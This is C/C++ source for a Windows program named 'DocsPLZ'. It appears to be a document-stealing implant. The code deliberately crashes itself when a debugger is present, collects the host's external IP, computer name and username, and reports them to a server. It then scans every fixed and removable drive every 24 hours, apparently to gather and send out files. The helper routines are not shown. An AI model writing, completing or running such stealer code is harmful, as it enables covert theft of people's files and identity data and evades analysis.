#include "commun.h"

#define BUFFER_SIZE 1024

#pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Allocate console for debug output
    AllocConsole();
    FILE* pFile = nullptr;
    freopen_s(&pFile, "CONOUT$", "w", stdout);

    printf("[%s] DocsPLZ starting...\n", __TIME__);

    if (IsDebuggerPresentEx()) {
        int* crashPointer = NULL;
        *crashPointer = 42; // This will cause a crash
    }

    char ip[16] = { 0 };
    get_external_ip(ip);
    printf("[+] External IP: %s\n", ip);

    // Get computer name and username
    char computerName[MAX_PATH];
    DWORD size = sizeof(computerName);
    if (!GetComputerNameA(computerName, &size)) {
        printf("[-] Failed to get computer name. Error: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Computer Name: %s\n", computerName);

    char username[MAX_PATH];
    size = sizeof(username);
    if (!GetUserNameA(username, &size)) {
        printf("[-] Failed to get username. Error: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Username: %s\n", username);

    // Create a JSON Initial meta data
    char InitMeta[1024];
    sprintf(
        InitMeta,
        "{\n"
        "    \"ip\": \"%s\",\n"
        "    \"computerName\": \"%s\",\n"
        "    \"userName\": \"%s\"\n"
        "}\n",
        ip,
        computerName,
        username
    );

    printf("\n[+] Initial metadata:\n%s\n", InitMeta);

    printf("[*] Attempting to connect to server...\n");
    ConnectToServer(ip, computerName, username);
    printf("[+] Initial connection completed\n");

    DWORD startTime = GetTickCount();
    DWORD scanCount = 0;

    while (true) {
        scanCount++;
        printf("\n[*] Starting scan #%lu\n", scanCount);
        printf("[*] Time running: %lu minutes\n", (GetTickCount() - startTime) / 60000);

        char logicalDrives[MAX_PATH * 4] = { 0 };
        DWORD result = GetLogicalDriveStringsA(MAX_PATH * 4, logicalDrives);
        if (result == 0) {
            printf("[-] Failed to get logical drives. Error: %d\n", GetLastError());
            Sleep(5000); // Wait 5 seconds before retrying
            continue;
        }

        int fileCount = 0;
        char* drive = logicalDrives;

        while (*drive) {
            UINT driveType = GetDriveTypeA(drive);
            printf("\n[*] Scanning drive: %s (Type: ", drive);

            switch (driveType) {
            case DRIVE_FIXED: printf("Fixed"); break;
            case DRIVE_REMOVABLE: printf("Removable"); break;
            case DRIVE_REMOTE: printf("Network"); break;
            case DRIVE_CDROM: printf("CD/DVD"); break;
            case DRIVE_RAMDISK: printf("RAM Disk"); break;
            default: printf("Unknown"); break;
            }
            printf(")\n");

            // Skip CD-ROM drives and network drives to avoid hanging
            if (driveType != DRIVE_CDROM && driveType != DRIVE_REMOTE) {
                // Remove trailing backslash
                size_t driveLen = strlen(drive);
                if (drive[driveLen - 1] == '\\') {
                    drive[driveLen - 1] = '\0';
                }

                DWORD startScanTime = GetTickCount();
                printf("[*] Starting scan of %s at %s\n", drive, __TIME__);

                findFiles(drive, &fileCount, ip, computerName, username);

                DWORD scanDuration = (GetTickCount() - startScanTime) / 1000;
                printf("[+] Completed scan of %s - Duration: %lu seconds\n", drive, scanDuration);
            }
            else {
                printf("[-] Skipping %s (unsupported drive type)\n", drive);
            }

            // Move to next drive
            drive += strlen(drive) + 1;
        }

        printf("\n[+] Scan #%lu completed - Total files processed: %d\n", scanCount, fileCount);
        printf("[*] Waiting 24 hours before next scan...\n");

        // Show a countdown timer
        for (int hours = 24; hours > 0; hours--) {
            printf("\r[*] Next scan in: %d hours    ", hours);
            Sleep(3600000); // Sleep for 1 hour
        }
    }

    if (pFile) {
        fclose(pFile);
    }
    FreeConsole();
    return 0;
}